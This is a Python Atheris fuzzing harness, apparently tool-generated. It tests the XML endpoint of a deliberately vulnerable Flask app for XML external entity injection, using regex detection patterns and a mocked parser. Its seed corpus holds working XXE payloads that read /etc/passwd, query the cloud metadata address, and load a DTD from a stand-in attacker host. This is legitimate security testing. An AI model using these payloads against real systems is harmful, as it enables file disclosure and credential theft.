import atheris
import sys
import re
import os

from unittest.mock import patch, MagicMock



REPO_ROOT = "/home/trieudai/VulnHunterX/repos/python/realvuln-damn-vulnerable-flask-application"
if REPO_ROOT and REPO_ROOT not in sys.path:
    sys.path.insert(0, REPO_ROOT)

with atheris.instrument_imports():

    from app import xml


from app import app

# === FIXED CONTRACTS (DO NOT MODIFY) ===
_COMPILED_PATTERNS = [

    re.compile("<!DOCTYPE\\s+\\S+[^>]*<!ENTITY\\s+\\S+\\s+SYSTEM", re.IGNORECASE),

    re.compile("<!DOCTYPE\\s+\\S+[^>]*<!ENTITY\\s+\\S+\\s+PUBLIC", re.IGNORECASE),

    re.compile("<!ENTITY\\s+%\\s+\\S+\\s+SYSTEM", re.IGNORECASE),

]
_RAISE_MESSAGE  = "PY_XXE: external entity injection in XML payload — captured={captured} pattern={matched_pattern}"
_TAINTED_PARAMS = [{"name": "xml", "index": -1, "type": "str"}]
# ========================================

# === ORACLE CONTEXT ===
# strategy         : recorded_call
# patch_target     : app.etree.fromstring
# target_arg_index : 0
# target_arg_name  : text
# input_strategy   : flask_view
# signature        : def xml()
# condition        : The captured XML string contains a DOCTYPE declaration with an external ENTITY definition (SYSTEM or PUBLIC), confirming an XXE payload reached the unsafe parser
# capture_what     : raw XML string passed to etree.fromstring from request.form['xml']
# skip_hint        : False
# ========================================


# === SEED CORPUS — bypass-oriented, derived from trigger_patterns ===
_SEED_CORPUS = [
    b'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
    b'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe PUBLIC "-//W3C//DTD//EN" "file:///etc/passwd">]><root>&xxe;</root>',
    b'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><root></root>',
    b'<?xml version="1.0"?><!DocType foo [<!Entity xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
    b'<?xml version="1.0"?>  <!DOCTYPE  foo  [  <!ENTITY  xxe  SYSTEM  "file:///etc/passwd"  >  ]  ><root>&xxe;</root>',
    b'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe PUBLIC "foo" "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>',
    b'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;]><root/></root>',
    b"<?xml version='1.0'?><!DOCTYPE foo [\n<!ENTITY xxe SYSTEM 'file:///etc/hostname'>\n]><foo>&xxe;</foo>",
]


def TestOneInput(data):
    fdp = atheris.FuzzedDataProvider(data)

    param_xml = fdp.ConsumeBytes(len(data)).decode('utf-8', errors='ignore')

    form_data = {
        "xml": param_xml,
    }

    with app.test_request_context(method='POST', data=form_data, content_type='application/x-www-form-urlencoded'):
        with patch('app.etree.fromstring') as mock_fromstring:
            mock_fromstring.return_value = MagicMock()

            try:
                xml()
            except RuntimeError:
                raise
            except Exception:
                pass

            for call in mock_fromstring.call_args_list:
                captured = None
                if call.args and len(call.args) > 0:
                    captured = str(call.args[0])
                elif call.kwargs:
                    captured = str(call.kwargs.get("text", ""))

                if captured:
                    for pattern in _COMPILED_PATTERNS:
                        m = pattern.search(captured)
                        if m:
                            raise RuntimeError(_RAISE_MESSAGE.format(captured=captured, matched_pattern=m.pattern))



if __name__ == "__main__":
    _CORPUS_DIR = "output/python/realvuln-damn-vulnerable-flask-application/fuzz_corpus/py_xxe_app_py_159"
    os.makedirs(_CORPUS_DIR, exist_ok=True)
    for _i, _seed in enumerate(_SEED_CORPUS):
        _seed_path = os.path.join(_CORPUS_DIR, f"seed_{_i:03d}")
        if not os.path.exists(_seed_path):
            with open(_seed_path, "wb") as _f:
                _f.write(_seed if isinstance(_seed, bytes) else _seed.encode("utf-8"))

    if _CORPUS_DIR not in sys.argv:
        sys.argv.append(_CORPUS_DIR)

    atheris.Setup(sys.argv, TestOneInput)
    atheris.Fuzz()